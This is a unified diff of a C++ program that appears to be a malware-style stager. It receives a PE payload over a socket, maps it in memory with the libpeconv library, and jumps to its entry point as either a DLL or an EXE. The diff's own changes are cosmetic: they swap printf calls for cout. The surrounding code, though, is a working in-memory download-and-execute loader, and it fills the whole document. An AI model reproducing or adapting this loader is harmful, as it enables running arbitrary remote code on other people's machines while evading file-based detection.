@@ -64,9 +64,9 @@ void fetch_payload()
     printf("Receving data failed\n");
   }
   
-  printf("[*] stage size: %u\n", bufsize);
+  std::cout << "[*] stage size: " << bufsize << std::endl << std::flush;
   buf = (BYTE *)malloc(bufsize);
-  printf("[*] downloading stage: ");
+  std::cout << "[*] downloading stage: " << std::flush;
   
   unsigned int length = bufsize;
   int location = 0;
@@ -77,17 +77,17 @@ void fetch_payload()
     length = length - received;
     //printf(".", received);
   }
-  printf("success!\n");
+  std::cout << "success!" << std::endl << std::flush;
   closesocket(s);
-  printf("[*] peconv::load_pe_executable: ");
+  std::cout << "[*] peconv::load_pe_executable: " << std::flush;
   g_Payload = peconv::load_pe_executable(buf, bufsize, g_PayloadSize);
-  printf("success!\n");
+  std::cout << "success!\n" << std::endl << std::flush;
 }
 
 int run_payload(int argc, LPTSTR argv[])
 {
   if (!g_Payload) {
-    std::cerr << "[!] The payload is not loaded!\n";
+    std::cout << "[!] The payload is not loaded!\n";
     return -1;
   }
   
@@ -97,7 +97,7 @@ int run_payload(int argc, LPTSTR argv[])
   //calculate the Entry Point of the manually loaded module
   DWORD ep_rva = peconv::get_entry_point_rva(g_Payload);
   if (!ep_rva) {
-    std::cerr << "[!] Cannot fetch EP!\n";
+    std::cout << "[!] Cannot fetch EP!\n";
     return -2;
   }
   const ULONG_PTR ep_va = ep_rva + (ULONG_PTR)g_Payload;
@@ -116,11 +116,11 @@ int run_payload(int argc, LPTSTR argv[])
     ret = new_main((HINSTANCE)g_Payload, DLL_PROCESS_ATTACH, 0);
   }
   else {
-    std::cout << "[+] starting EXE payload...\n";
+    std::cout << "[+] starting EXE payload...\n" << std::flush;
     //the simplest prototype of the main fuction:
     int basic_main(int, LPTSTR []);
     auto new_main = reinterpret_cast<decltype(&basic_main)>(ep_va);
-    
+
     //call the Entry Point of the manually loaded PE:
     ret = new_main(argc, argv);
   }
@@ -130,6 +130,6 @@ int run_payload(int argc, LPTSTR argv[])
 int _tmain(int argc, LPTSTR argv[])
 {
   fetch_payload();
-  std::cout << "[+] Payload loaded!\n";
+  std::cout << "[+] Payload loaded!\n" << std::flush;
   return run_payload(argc, argv);
 }
